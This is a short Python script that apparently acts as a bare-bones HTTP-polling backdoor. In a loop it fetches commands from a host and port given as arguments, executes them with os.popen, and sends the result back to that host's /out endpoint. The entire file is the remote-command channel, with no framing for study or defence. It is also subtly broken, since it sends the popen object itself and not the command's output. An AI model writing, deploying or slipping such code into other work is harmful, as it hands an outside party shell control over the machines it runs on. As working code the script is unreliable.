#!/usr/bin/env python3

from time import sleep
import os
import requests
import sys

if __name__ == "__main__":
    host = sys.argv[1]
    port = int(sys.argv[2])
    while True:
        r = requests.get(f"http://{host}:{port}")
        output = os.popen(r.text, "r", 1)
        requests.get(f"http://{host}:{port}/out", params={"q": output})
        sleep(0.25)
